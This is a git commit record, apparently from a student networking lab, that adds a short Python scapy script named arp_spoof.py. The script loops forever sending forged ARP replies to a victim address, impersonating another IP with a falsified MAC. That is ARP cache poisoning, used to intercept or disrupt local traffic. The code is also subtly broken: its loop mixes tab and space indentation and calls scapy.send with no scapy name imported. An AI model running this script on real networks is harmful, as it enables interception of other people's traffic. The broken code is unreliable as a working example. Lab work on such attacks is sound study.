ebc697cd109891779f402acc50323a554e5fb0ca
Dumbears <gebel.romain@ynov.com>
2025-02-13 11:39:36 +0100

    MAJ

---
+++ tp4/arp_spoof.py
@@ -0,0 +1,11 @@
+from scapy.all import *
+import time
+
+target_ip = "10.1.1.10"   # Machine victime
+spoof_ip = "10.1.1.101"   # IP usurpée
+spoof_mac = "00:15:5d:01:01:01"  # MAC falsifiée
+
+while True:
+    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwsrc=spoof_mac)
+	scapy.send(packet, verbose = False)
+	time.sleep(1)
